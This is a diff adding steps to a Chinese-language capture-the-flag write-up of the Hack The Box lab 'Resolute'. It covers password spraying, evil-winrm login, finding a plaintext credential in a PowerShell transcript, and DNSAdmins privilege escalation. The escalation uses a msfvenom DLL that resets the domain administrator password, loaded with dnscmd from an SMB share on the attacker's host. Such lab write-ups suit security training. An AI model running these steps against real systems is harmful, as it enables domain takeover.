@@ -1,5 +1,5 @@
 ---
-description: Medium / DNSadmins提权
+description: Medium / 枚举 / DNSadmins提权
 ---
 
 # ✔️ Resolute
@@ -81,6 +81,12 @@ crackmapexec smb 10.129.96.155 -u marko -p 'Welcome123!'
 
 <figure><img src="../../.gitbook/assets/14 (6).png" alt=""><figcaption></figcaption></figure>
 
+```bash
+evil-winrm -i 10.129.96.155 -u marko -p Welcome123!
+```
+
+<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
+
 * 几次尝试确认自己没有输错后，发现该账户确实登录不上去，决定密码喷洒来找出是否还有其他用户账号也是用的这个密码：
 
 ```bash
@@ -95,33 +101,93 @@ crackmapexec smb 10.129.96.155 -u username.txt -p 'Welcome123!'
 
 ### GET SHELL
 
-* 使用
+* 使用evil-winrm和新的凭证登录成功：
 
+```bash
+evil-winrm -i 10.129.96.155 -u melanie -p Welcome123!
+```
 
+<figure><img src="../../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
 
-
+<figure><img src="../../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
 ### 本地信息收集
 
+* 简单手动枚举无果后，决定上传winPEAS进行信息收集：
 
+<figure><img src="../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
 
+* winPEAS也没什么收获，上传sharphound收集，用bloodhound分析：
 
+<figure><img src="../../.gitbook/assets/22.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/24.png" alt=""><figcaption></figcaption></figure>
 
+* 至此，仍然无任何明显收获，应该是方向错了。决定从头开始枚举，列出了之前忽略掉的隐藏目录PSTranscripts：
 
+```powershell
+dir -force
+```
 
+<figure><img src="../../.gitbook/assets/25.png" alt=""><figcaption></figcaption></figure>
+
+* 找到了一个txt文件，查看后貌似是一个日志记录的文件，是关于用户ryan的：
+
+<figure><img src="../../.gitbook/assets/27.png" alt=""><figcaption></figcaption></figure>
+
+* 同时也在这个txt文件中发现了用户<mark style="color:red;">**ryan**</mark>的登录凭证：<mark style="color:red;">**Serv3r4Admin4cc123!**</mark>
+
+<figure><img src="../../.gitbook/assets/28.png" alt=""><figcaption></figcaption></figure>
+
+* 使用该凭证登录ryan账户后，枚举一下这个ryan的相关信息：
+
+<figure><img src="../../.gitbook/assets/29.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/30.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/31.png" alt=""><figcaption></figcaption></figure>
+
+* 在ryan账户下，发现了一个note.txt文档，像是一个备忘录之类的文档，没看出什么实际作用：
+
+<figure><img src="../../.gitbook/assets/32.png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
+* 至此无法再继续下去，看提示后知道此处是DNSadmins滥用导致的提权攻击，才注意到ryan账户是DNSadmins组的成员账户，而该组成员是有权向目标DNS写入文件的。
+* 使用msfvenom制作一个DLL文件，其中包含了自定义的administrator的登录密码，然后在kali本地开启smbserver：
 
+```bash
+msfvenom -p windows/x64/exec cmd='net user administrator fiii123 /domain' -f dll > resolute.dll
+```
 
+<figure><img src="../../.gitbook/assets/33.png" alt=""><figcaption></figcaption></figure>
 
+```bash
+# 开启smbserver:
+python3 smbserver.py share ./
+```
 
+<figure><img src="../../.gitbook/assets/35.png" alt=""><figcaption></figcaption></figure>
 
+* 在目标系统上下载这个DLL文件，重启一下DNS服务，该DLL文件即可生效：
+
+```bash
+cmd /c dnscmd localhost /config /serverlevelplugindll \10.10.16.12\share\resolute.dll
+```
+
+<figure><img src="../../.gitbook/assets/34.png" alt=""><figcaption></figcaption></figure>
+
+* 使用psexec.py和刚才自定义的新的administrator的密码登录后，成功ROOT：
+
+<figure><img src="../../.gitbook/assets/36 (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/37 (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例Get Shell阶段不难，常规的信息收集之后就能拿到。提权阶段涉及到了我的盲点，第一次遇到DNSadmins提权，查阅了一些提示和技术解析的文章后，成功root。
